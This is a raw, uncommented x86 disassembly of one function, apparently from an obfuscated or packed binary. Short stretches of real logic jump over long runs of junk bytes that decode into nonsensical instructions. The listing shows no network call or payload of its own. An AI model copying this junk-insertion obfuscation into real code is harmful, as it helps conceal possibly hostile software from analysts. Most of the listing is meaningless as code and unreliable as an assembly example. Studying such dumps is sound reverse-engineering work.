  40c0ab:	mov    edx,DWORD PTR [ebp+0x8]
  40c0ae:	xor    eax,ecx
  40c0b0:	lea    eax,[eax+edx*1+0x32729f]
  40c0b7:	mov    DWORD PTR [ebp+0x8],eax
  40c0ba:	mov    eax,DWORD PTR [ebp-0x18]
  40c0bd:	mov    edx,DWORD PTR [ebp+0x14]
  40c0c0:	xor    eax,ecx
  40c0c2:	add    eax,esi
  40c0c4:	imul   eax,DWORD PTR [edx]
  40c0c7:	mov    edx,DWORD PTR [ebp-0x4]
  40c0ca:	xor    edx,ecx
  40c0cc:	mov    ecx,DWORD PTR [ebp+0x8]
  40c0cf:	jmp    0x40c1b4
  40c0d4:	mov    ebx,0x61b1c335
  40c0d9:	pop    ecx
  40c0da:	mov    ecx,0x5c6a2de5
  40c0df:	xchg   edi,eax
  40c0e0:	sub    BYTE PTR [edx],0x18
  40c0e3:	sti    
  40c0e4:	loope  0x40c11b
  40c0e6:	jle    0x40c166
  40c0e8:	mov    dh,0x7e
  40c0ea:	jle    0x40c16a
  40c0ec:	sti    
  40c0ed:	aaa    
  40c0ee:	push   ebx
  40c0ef:	pop    ebp
  40c0f0:	jge    0x40c170
  40c0f2:	ficomp DWORD PTR [ecx]
  40c0f4:	pop    eax
  40c0f5:	and    DWORD PTR [ebx],0xcab6594
  40c0fb:	add    al,BYTE PTR [edi+eiz*2-0x6]
  40c0ff:	xchg   esi,eax
  40c100:	sub    edx,0xfffffff8
  40c103:	lds    ebp,FWORD PTR [edi-0x38]
  40c106:	hlt    
  40c107:	loope  0x40c0cd
  40c109:	in     al,0x94
  40c10b:	mov    ecx,0x1f4d9a64
  40c110:	outs   dx,DWORD PTR ds:[esi]
  40c111:	test   bl,0xc2
  40c114:	lds    ecx,FWORD PTR [ebx]
  40c116:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c117:	loopne 0x40c0bc
  40c119:	jno    0x40c164
  40c11b:	fadd   DWORD PTR [ecx+0x3f6508f8]
  40c121:	jg     0x40c0a4
  40c123:	adc    al,0x89
  40c125:	xor    dh,BYTE PTR [ebx+0x0]
  40c128:	pop    ds
  40c129:	push   ss
  40c12a:	push   eax
  40c12b:	ret    
  40c12c:	scas   eax,DWORD PTR es:[edi]
  40c12d:	dec    ecx
  40c12e:	dec    BYTE PTR [eax+0x61]
  40c131:	adc    DWORD PTR [edx-0x55],ecx
  40c134:	call   0x25b5:0xa4bb4b02
  40c13b:	jne    0x40c17e
  40c13d:	rcl    BYTE PTR [ebp-0x71],0x24
  40c141:	cld    
  40c142:	mov    esp,0xf5a682b5
  40c147:	stos   BYTE PTR es:[edi],al
  40c148:	mov    edx,0x38cdd009
  40c14d:	lahf   
  40c14e:	xor    DWORD PTR [eax],esp
  40c150:	cmp    eax,0xe1272890
  40c155:	sub    BYTE PTR [eax+0x11141de3],cl
  40c15b:	(bad)  
  40c15c:	js     0x40c1d9
  40c15e:	fisub  WORD PTR [edi]
  40c160:	shl    eax,cl
  40c162:	fcomp  st(5)
  40c164:	loopne 0x40c1d2
  40c166:	or     eax,0xff9f252a
  40c16b:	add    ebx,DWORD PTR [ebx+esi*8]
  40c16e:	mov    ds:0x385523c6,al
  40c173:	cld    
  40c174:	neg    BYTE PTR [ebx-0x61]
  40c177:	(bad)  [esp+edi*8]
  40c17a:	loopne 0x40c13a
  40c17c:	jge    0x40c16c
  40c17e:	dec    edx
  40c17f:	out    0xea,al
  40c181:	hlt    
  40c182:	add    DWORD PTR [eax-0x2e],ebp
  40c185:	cmp    eax,0x6e029fa5
  40c18a:	leave  
  40c18b:	xchg   esi,eax
  40c18c:	lods   eax,DWORD PTR ds:[esi]
  40c18d:	test   al,ch
  40c18f:	stc    
  40c190:	sbb    DWORD PTR [edx],ecx
  40c192:	inc    edi
  40c193:	cwde   
  40c194:	sti    
  40c195:	or     eax,0xc546f7ae
  40c19a:	out    dx,eax
  40c19b:	icebp  
  40c19c:	xor    ebp,ebp
  40c19e:	mov    ecx,DWORD PTR [edi-0x6f3deeef]
  40c1a4:	mov    ch,0x14
  40c1a7:	pop    ebp
  40c1a8:	sub    DWORD PTR [edi+ecx*2],ecx
  40c1ab:	scas   al,BYTE PTR es:[edi]
  40c1ac:	or     al,0x82
  40c1ae:	fsubr  QWORD PTR [ecx-0x6f99324a]
  40c1b4:	lea    ecx,[edx+ecx*1+0x32729f]
  40c1bb:	cmp    ecx,eax
  40c1bd:	jne    0x40bf8f
  40c1c3:	mov    ebx,esi
  40c1c5:	jmp    0x40c2b4
  40c1ca:	mov    ebx,0x32729f
  40c1cf:	jmp    0x40c2b4
  40c1d4:	mov    al,0x75
  40c1d6:	or     eax,0x598459f4
  40c1db:	leave  
  40c1dc:	jns    0x40c1f9
  40c1de:	or     ah,BYTE PTR [ecx+0x48e87dc7]
  40c1e4:	cmp    edx,ecx
  40c1e6:	jle    0x40c266
  40c1e8:	mov    dh,0x7e
  40c1ea:	jle    0x40c26a
  40c1ec:	fbstp  TBYTE PTR [ebp-0x43]
  40c1ef:	test   DWORD PTR [esi-0x39b7ab8],ecx
  40c1f5:	fcomp  DWORD PTR [esi-0x56]
  40c1f8:	retf   0x556d
  40c1fb:	cmp    DWORD PTR ds:0x6b3521d5,0x33
  40c203:	push   edi
  40c204:	mov    cl,0x64
  40c206:	test   BYTE PTR [esi+0x3209a311],ah
  40c20c:	je     0x40c1b4
  40c20e:	push   0x4f
  40c210:	add    bh,BYTE PTR [ecx+0xd08a99]
  40c216:	aam    0x7a
  40c218:	in     al,dx
  40c219:	push   0xdd91b083
  40c21e:	pop    esp
  40c21f:	and    al,0xc3
  40c221:	inc    edi
  40c222:	rol    DWORD PTR [ebx+0x37],1
  40c225:	icebp  
  40c226:	jmp    0x40c21e
  40c228:	retf   
  40c229:	and    BYTE PTR [edi+edi*4],dl
  40c22c:	out    0x34,eax
  40c22e:	jae    0x40c2a8
  40c230:	push   0x9a916b55
  40c235:	push   ebx
  40c236:	pusha  
  40c237:	ret    
  40c238:	mov    edx,0xd57b0af1
  40c23d:	shr    DWORD PTR [ebp-0x56],0x21
  40c241:	clc    
  40c242:	mov    bh,0x3f
  40c244:	js     0x40c284
  40c246:	enter  0xc290,0xa2
  40c24a:	out    0x6b,eax
  40c24c:	test   DWORD PTR [bx+si-0x6e],0xe937bf9c
  40c254:	loopne 0x40c274
  40c256:	xchg   esi,eax
  40c257:	jns    0x40c2a5
  40c259:	jmp    0x16c8baac
  40c25e:	test   esp,0x3136b720
  40c264:	dec    ebx
  40c265:	nop
  40c266:	and    al,0xc7
  40c269:	int3   
  40c26a:	paddsw mm4,QWORD PTR [esi-0x5e]
  40c26e:	pop    esp
  40c26f:	fwait
  40c270:	test   al,0xaa
  40c272:	mov    ebx,0x7bf6b544
  40c277:	shl    eax,cl
  40c279:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c27a:	xchg   esi,eax
  40c27b:	ret    0x3ed4
  40c27e:	cli    
  40c27f:	lods   eax,DWORD PTR ds:[esi]
  40c280:	add    DWORD PTR [eax+ecx*8+0x1],0x3bf1aeb5
  40c288:	jno    0x40c2cf
  40c28a:	mov    edi,0xbc64fc46
  40c28f:	das    
  40c290:	loopne 0x40c271
  40c292:	loop   0x40c22e
  40c294:	ror    BYTE PTR [edx+0x25],0xea
  40c298:	sub    eax,0x13e74ea9
  40c29d:	scas   al,BYTE PTR es:[di]
  40c29f:	arpl   WORD PTR [ebx-0x69],bx
  40c2a2:	fwait
  40c2a3:	push   cs
  40c2a4:	xor    eax,0x6dde1d3e
  40c2a9:	push   edx
  40c2aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2ab:	xor    ah,bh
  40c2ad:	mov    cl,0xce
  40c2af:	dec    esp
  40c2b0:	ficomp WORD PTR [ecx+eiz*4]
  40c2b3:	jbe    0x40c240
  40c2b5:	inc    ebp
  40c2b6:	cld    
  40c2b7:	xor    eax,0x7510859
  40c2bc:	add    eax,ebx
  40c2be:	mov    DWORD PTR [ebp-0xc],eax
  40c2c1:	xor    ebx,ebx
  40c2c3:	lea    eax,[ebp-0x10]
  40c2c6:	add    ebx,DWORD PTR [eax]
  40c2c8:	jmp    0x40c3ad
  40c2cd:	sbb    al,0xbe
  40c2cf:	cmp    al,0xc2
  40c2d1:	pop    esp
  40c2d2:	inc    eax
  40c2d3:	and    BYTE PTR [eax+0x3b],ah
  40c2d6:	gs xchg edx,ebp
  40c2d9:	add    BYTE PTR ds:0xcb71112e,bl
  40c2df:	jle    0x40c35f
  40c2e1:	mov    dh,0x7e
  40c2e3:	jle    0x40c363
  40c2e5:	jg     0x40c2b2
  40c2e7:	dec    ebx
  40c2e8:	arpl   WORD PTR [ebx+eiz*4+0x49],bp
  40c2ec:	and    al,al
  40c2ee:	es daa 
  40c2f0:	xor    BYTE PTR [eax],0x13
  40c2f3:	inc    edi
  40c2f4:	test   BYTE PTR [esi+ebp*4],0x2f
  40c2f8:	leave  
  40c2f9:	nop
  40c2fa:	loopne 0x40c350
  40c2fc:	pop    ss
  40c2fd:	dec    edx
  40c2fe:	mov    ch,0x59
  40c300:	mov    dl,0x63
  40c302:	xchg   esp,eax
  40c303:	xlat   BYTE PTR ds:[ebx]
  40c304:	fidivr DWORD PTR [ebp-0x68]
  40c307:	push   esp
  40c308:	mov    al,0x82
  40c30a:	xor    BYTE PTR [esp+esi*4],ah
  40c30d:	das    
  40c30e:	jnp    0x40c356
  40c310:	add    ebp,edi
  40c312:	pop    esp
  40c313:	fdivr  DWORD PTR ds:0x7067bc11
  40c319:	fstp   QWORD PTR ds:0xbbcc82c8
  40c31f:	jp     0x40c2c4
  40c321:	test   ch,dl
  40c323:	neg    BYTE PTR ds:0x92e840d2
  40c329:	inc    esi
  40c32a:	and    al,0x64
  40c32c:	push   edx
  40c32d:	gs mov ebx,0xe792fb38
  40c333:	xchg   ebp,eax
  40c334:	add    eax,0x5437310f
  40c339:	jge    0x40c34a
  40c33b:	adc    eax,0xb3316188
  40c340:	jl     0x40c327
  40c342:	adc    al,0x5
  40c344:	das    
  40c345:	xor    eax,0x4aa1d2ab
  40c34a:	cmp    al,0x8b
  40c34c:	ins    DWORD PTR es:[edi],dx
  40c34d:	sbb    DWORD PTR [edi-0x2],eax
  40c350:	imul   ecx,DWORD PTR [edi+0x1da69f78],0x28
  40c357:	lahf   
  40c358:	out    0x77,al
  40c35a:	test   BYTE PTR [edi+0x10484863],0xd7
  40c361:	xor    al,0xb6
  40c363:	pop    ds
  40c364:	ficomp DWORD PTR [ebx+0x65406964]
  40c36a:	into   
  40c36b:	aam    0x87
  40c36d:	test   DWORD PTR [edx+0x7fbea55a],esp
  40c373:	mov    eax,DWORD PTR [eax-0x2e]
  40c376:	scas   eax,DWORD PTR es:[edi]
  40c377:	lods   al,BYTE PTR ds:[esi]
  40c378:	pop    esi
  40c379:	les    edi,FWORD PTR [ebx-0xb8029ee]
  40c37f:	cmp    edx,ebx
  40c381:	retf   0xc2a6
  40c384:	add    cl,BYTE PTR [edx+0x18]
  40c387:	add    eax,0x87852be6
  40c38c:	lock test esp,edx
  40c38f:	pop    edx
  40c390:	mov    edx,0xf2402f71
  40c395:	add    ebp,DWORD PTR [edx-0x1c]
  40c398:	test   al,0x88
  40c39a:	test   DWORD PTR [ebx],edi
  40c39c:	popa   
  40c39d:	in     eax,0x91
  40c39f:	jl     0x40c37e
  40c3a1:	sbb    edi,DWORD PTR [edx-0x642e5c9a]
  40c3a7:	adc    esi,esp
  40c3a9:	das    
  40c3aa:	jecxz  0x40c3cd
  40c3ac:	ret    0xd3ff
  40c3af:	xor    ebx,ebx
  40c3b1:	jmp    0x40c496
  40c3b6:	popa   
  40c3b7:	jno    0x40c409
  40c3b9:	jnp    0x40c41b
  40c3bb:	jnp    0x40c436
  40c3bd:	or     DWORD PTR ds:0xe42e5fee,ecx
  40c3c3:	sbb    dh,BYTE PTR [ebx+0x7ecb49a8]
  40c3c9:	jle    0x40c381
  40c3cb:	jle    0x40c44b
  40c3cd:	jle    0x40c35b
  40c3cf:	call   0x91d1b20a
  40c3d4:	ja     0x40c3ca
  40c3d6:	and    dh,al
  40c3d8:	push   esi
  40c3d9:	jo     0x40c3d4
  40c3db:	adc    al,0x9b
  40c3dd:	js     0x40c365
  40c3df:	pop    ebp
  40c3e0:	mov    ecx,0xd02166d2
  40c3e5:	sub    BYTE PTR ds:0xd1888715,al
  40c3eb:	pop    edi
  40c3ec:	or     al,0x38
  40c3ee:	fdiv   DWORD PTR [eax-0x6226c56d]
  40c3f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3f5:	ret    
  40c3f6:	pop    edx
  40c3f7:	xchg   ebp,eax
  40c3f8:	sub    edi,DWORD PTR [edx+ecx*8]
  40c3fb:	xchg   ebp,eax
  40c3fc:	loop   0x40c40b
  40c3fe:	mov    eax,0x834cc349
  40c403:	inc    ecx
  40c404:	and    ah,BYTE PTR [ebx+0xa7be911]
  40c40a:	hlt    
  40c40b:	mov    ch,0xd8
  40c40d:	sbb    edi,DWORD PTR [edi+0x54]
  40c410:	data16 lahf 
  40c412:	or     eax,0xe5ad1ef5
  40c417:	mov    eax,ds:0x33bf6e17
  40c41c:	addr16 mov ah,0xfa
  40c41f:	arpl   WORD PTR [edx+0x4],cx
  40c422:	test   DWORD PTR [eax+ecx*4-0x2d],ebp
  40c426:	fs pop edx
  40c428:	jne    0x40c45f
  40c42a:	and    ebp,ebp
  40c42c:	ret    
  40c42d:	xor    esi,edi
  40c42f:	lea    esp,[edx-0x6bbf9a7d]
  40c435:	jmp    0xcdc4:0x2430ec23
  40c43c:	dec    eax
  40c43d:	imul   esp,DWORD PTR ds:0xb9be4285,0xda12639e
  40c447:	mov    edx,0xab9ce686
  40c44c:	lods   al,BYTE PTR ds:[esi]
  40c44d:	xlat   BYTE PTR ds:[ebx]
  40c44e:	fcom   QWORD PTR [edi]
  40c450:	pop    esp
  40c451:	fld    TBYTE PTR [esi]
  40c453:	les    ebp,FWORD PTR [ebp+0x3d]
  40c456:	dec    eax
  40c457:	nop
  40c458:	sbb    al,0x26
  40c45a:	jmp    0x40c443
  40c45c:	push   DWORD PTR [ecx+0x11]
  40c45f:	or     eax,0x6c167765
  40c464:	fidivr DWORD PTR [esi-0x3c0fc453]
  40c46a:	ret    
  40c46b:	and    eax,0xa27cb8b7
  40c470:	stos   DWORD PTR es:[edi],eax
  40c471:	jae    0x40c4db
  40c473:	sub    DWORD PTR [ecx-0x37],0x2c06043e
  40c47a:	mov    esi,0xa75a2e4c
  40c47f:	push   es
  40c480:	push   ecx
  40c481:	mov    ecx,0x5883cecc
  40c486:	pop    es
  40c487:	push   eax
  40c488:	xchg   DWORD PTR [edx+eax*8-0x45a0670f],edx
  40c48f:	call   0x72ab:0xe4c93b11
  40c496:	inc    ebx
  40c497:	cmp    DWORD PTR [ebp+0x10],ebx
  40c49a:	jmp    0x40c57f
  40c49f:	test   al,0xfc
  40c4a1:	xchg   esi,eax
  40c4a2:	push   esi
  40c4a3:	stos   BYTE PTR es:[edi],al
  40c4a4:	push   esp
  40c4a5:	push   0xe4b270b0
  40c4aa:	and    DWORD PTR gs:[ebx-0x2a],ebp
  40c4ae:	mov    BYTE PTR [ecx-0x49818138],0x7e
  40c4b5:	jle    0x40c535
  40c4b7:	jge    0x40c458
  40c4b9:	sub    esi,ecx
  40c4bb:	aam    0x84
  40c4bd:	jp     0x40c4ea
  40c4bf:	out    0xde,eax
  40c4c1:	cli    
  40c4c2:	add    edx,DWORD PTR [edi]
  40c4c4:	adc    al,0xbe
  40c4c6:	push   ds
  40c4c7:	mov    ?,esp
  40c4c9:	imul   ecx,DWORD PTR [edi],0xffffffe7
  40c4cc:	jbe    0x40c48b
  40c4ce:	jbe    0x40c501
  40c4d0:	add    ch,ah
  40c4d2:	push   edx
  40c4d3:	enter  0xdc2a,0x37
  40c4d7:	dec    edx
  40c4d8:	addr16 popa 
  40c4da:	mov    dh,0x4c
  40c4dc:	and    DWORD PTR [esp+ebp*4-0x55],edx
  40c4e0:	xlat   BYTE PTR ds:[ebx]
  40c4e1:	sub    eax,0x6d976d7a
  40c4e6:	xchg   edi,eax
  40c4e7:	popa   
  40c4e8:	ins    DWORD PTR es:[edi],dx
  40c4e9:	es pop edi
  40c4eb:	push   esi
  40c4ec:	xchg   edx,eax
  40c4ed:	or     bl,BYTE PTR ds:0xc1fd39f5
  40c4f3:	sbb    ebx,0x5dbfc202
  40c4f9:	xor    ecx,DWORD PTR [ebx+0x604ee04e]
  40c4ff:	out    dx,al
  40c500:	add    ah,cl
  40c502:	pop    ebp
  40c503:	mov    eax,DWORD PTR [ebp+0x730b7648]
  40c509:	mov    edx,?
  40c50b:	mov    ch,0x5c
  40c50d:	xor    eax,0x343eee74
  40c512:	jnp    0x40c541
  40c514:	in     eax,dx
  40c515:	loop   0x40c515
  40c517:	mov    al,0xce
  40c519:	mov    ds:0x763cada1,eax
  40c51e:	xor    bl,BYTE PTR [edx]
  40c520:	adc    edx,esi
  40c522:	push   0xe7458afe
  40c527:	mov    esi,esi
  40c529:	(bad)
  40c52d:	fsubr  QWORD PTR [edx-0x2f]
  40c530:	fiadd  WORD PTR [edx-0x3b1bdab6]
  40c536:	pop    edi
  40c537:	mov    esp,0xcd981c36
  40c53c:	jmp    0x5ee77dc2
  40c541:	lahf   
  40c542:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c543:	mov    cl,0x8a
  40c545:	xchg   edx,eax
  40c546:	mov    ebx,0x5a0ef9af
  40c54b:	adc    BYTE PTR [ebx],dl
  40c54d:	arpl   WORD PTR [ebp+0x6d513b8],cx
  40c553:	arpl   cx,dx
  40c555:	imul   edi,DWORD PTR ds:0xdcfbdcac,0xffffffaa
  40c55c:	idiv   DWORD PTR [edi+0x442e2598]
  40c562:	add    bh,BYTE PTR [ecx]
  40c564:	dec    ebp
  40c565:	mov    bh,BYTE PTR [ebx-0x21]
  40c568:	jbe    0x40c566
  40c56a:	js     0x40c57c
  40c56c:	mov    ds:0x25e20e4a,al
  40c571:	add    edx,DWORD PTR [edi-0x3c]
  40c574:	cmp    BYTE PTR [edx-0x3a],bh
  40c577:	jecxz  0x40c549
  40c579:	adc    eax,0x64801f01
  40c57e:	dec    edx
  40c57f:	je     0x40c682
  40c585:	xchg   edx,eax
  40c586:	push   0xa
  40c588:	pop    ecx
  40c589:	push   0x4
  40c58b:	pop    ebx
  40c58c:	inc    ebx
  40c58d:	xchg   ebx,ecx
  40c58f:	sub    ebx,ecx
  40c591:	xchg   ebx,ecx
  40c593:	jmp    0x40c678
  40c598:	xchg   DWORD PTR [eax+0x3d],ebx
  40c59b:	out    0x31,al
  40c59d:	jnp    0x40c544
  40c59f:	jns    0x40c5e7
  40c5a1:	add    al,0x4b
  40c5a3:	call   0xc28c968a
  40c5a8:	fxch   st(1)
  40c5aa:	jle    0x40c62a
  40c5ac:	mov    dh,0x7e
  40c5ae:	jle    0x40c62e
  40c5b0:	lock gs jne 0x40c574
  40c5b4:	jbe    0x40c603
  40c5b6:	jns    0x40c581
  40c5b8:	data16 sub al,0xd2
  40c5bb:	xor    esp,edi
  40c5bd:	repz dec ebp
  40c5bf:	(bad)  
  40c5c0:	(bad)  [ebx+0x5ab919c4]
  40c5c6:	fld    QWORD PTR [esp+ebp*2-0x76]
  40c5ca:	cmp    al,BYTE PTR [edi]
  40c5cc:	fsubr  DWORD PTR [ecx]
  40c5ce:	retf   0xb45
  40c5d1:	idiv   DWORD PTR [ecx+0x500d1892]
  40c5d7:	ds jnp 0x40c615
  40c5da:	mov    edi,0x11dd5ec2
  40c5df:	push   0xe576ed8c
  40c5e4:	xchg   ecx,eax
  40c5e5:	push   edi
  40c5e6:	pop    esp
  40c5e7:	adc    esp,DWORD PTR [eiz*1+0x4b96d3a]
  40c5ee:	mov    DWORD PTR [esi],eax
  40c5f0:	shl    BYTE PTR [ebx],1
  40c5f2:	(bad)  
  40c5f4:	mov    al,ds:0x40357851
  40c5f9:	inc    esi
  40c5fa:	test   DWORD PTR ds:0xd4e27bb9,esi
  40c600:	push   esp
  40c601:	jp     0x40c5c9
  40c603:	cmc    
  40c604:	(bad)
  40c608:	sub    BYTE PTR [edi],bh
  40c60a:	imul   eax,DWORD PTR [esi],0x16
  40c60d:	inc    edi
  40c60e:	add    edi,ecx
  40c610:	int3   
  40c611:	into   
  40c612:	(bad)
  40c616:	inc    ebp
  40c617:	sbb    DWORD PTR ds:[edx+0x7a7c5ac6],0xd3a7c822
  40c622:	jg     0x40c5a7
  40c624:	jns    0x40c5b8
  40c626:	popf   
  40c627:	ss aaa 
  40c629:	pop    ecx
  40c62a:	push   0xffffff8a
  40c62c:	mov    bl,BYTE PTR [ebp-0x56]
  40c62f:	sbb    al,0x51
  40c631:	(bad)
  40c634:	sbb    DWORD PTR [ebp-0x127efdc],ecx
  40c63a:	push   0xffffffb2
  40c63c:	xor    BYTE PTR [ecx+ecx*2+0x37],dh
  40c640:	mov    ebp,ebp
  40c642:	fiadd  WORD PTR [ebx+0x79]
  40c645:	jns    0x40c643
  40c647:	imul   edx,DWORD PTR [edx],0x48d3a812
  40c64d:	jno    0x40c65f
  40c64f:	popf   
  40c650:	int3   
  40c651:	aad    0x21
  40c653:	es mov cl,0x91
  40c656:	pusha  
  40c657:	mov    eax,0xbedaadfd
  40c65c:	pop    DWORD PTR [eax-0x2d]
  40c65f:	mov    edx,0xfdc80e4d
  40c664:	inc    esp
  40c665:	pop    es
  40c666:	push   0xffffffbc
  40c668:	and    ecx,0xa30342d9
  40c66e:	jbe    0x40c630
  40c670:	xchg   ebp,eax
  40c671:	cdq    
  40c672:	dec    edi
  40c673:	inc    edi
  40c674:	mov    eax,0x4927ed66
  40c679:	mov    eax,DWORD PTR [ebp-0x1c]
  40c67c:	imul   eax,ecx
  40c67f:	add    esp,eax
  40c681:	xchg   edx,eax
  40c682:	push   eax
  40c683:	xor    ebx,ebx
  40c685:	mov    edx,esp
  40c687:	dec    edx
  40c688:	inc    ebx
  40c689:	add    ebx,DWORD PTR [edx+ebx*1]
  40c68c:	dec    ebx
  40c68d:	xor    edx,edx
  40c68f:	add    DWORD PTR [ebp-0xc],ebx
  40c692:	pop    ebx
  40c693:	mov    eax,DWORD PTR [ebp-0xc]
  40c696:	pop    edi
  40c697:	pop    esi
  40c698:	pop    ebx
  40c699:	leave  
  40c69a:	ret    0x10
